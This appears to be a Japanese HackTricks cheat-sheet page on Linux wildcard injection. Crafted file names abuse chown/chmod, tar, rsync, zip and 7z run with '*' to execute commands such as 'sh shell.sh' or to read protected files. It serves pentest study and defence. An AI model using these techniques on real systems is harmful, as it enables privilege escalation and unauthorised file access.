{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

**どのファイルの所有者と権限を残りのファイルにコピーしたいかを指定できます**
```bash
touch "--reference=/my/own/path/filename"
```
この方法を利用して攻撃できます [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(結合攻撃)_\
詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) にあります。

## Tar

**任意のコマンドを実行する:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
この方法を利用して攻撃できます [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar攻撃)_\
詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) を参照してください。

## Rsync

**任意のコマンドを実行する:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
この攻撃は、[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_を使用して悪用できます。\
詳細は[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)を参照してください。

## 7z

**7z**では、`--`を`*`の前に使用しても（`--`は次の入力がパラメータとして扱われないことを意味しますので、この場合はファイルパスのみです）、任意のエラーを引き起こしてファイルを読み取ることができます。したがって、次のようなコマンドがrootによって実行されている場合：
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
このコマンドが実行されているフォルダーにファイルを作成できるので、`@root.txt`というファイルと、読みたいファイルへの**シンボリックリンク**である`root.txt`というファイルを作成できます：
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
その後、**7z** が実行されると、`root.txt` を圧縮すべきファイルのリストを含むファイルとして扱います（それが `@root.txt` の存在が示すことです）そして、7z が `root.txt` を読み込むと、`/file/you/want/to/read` を読み込み、**このファイルの内容がファイルのリストでないため、エラーをスローします** 内容を表示します。

_詳細は HackTheBox の CTF ボックスの Write-ups にあります。_

## Zip

**任意のコマンドを実行する:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
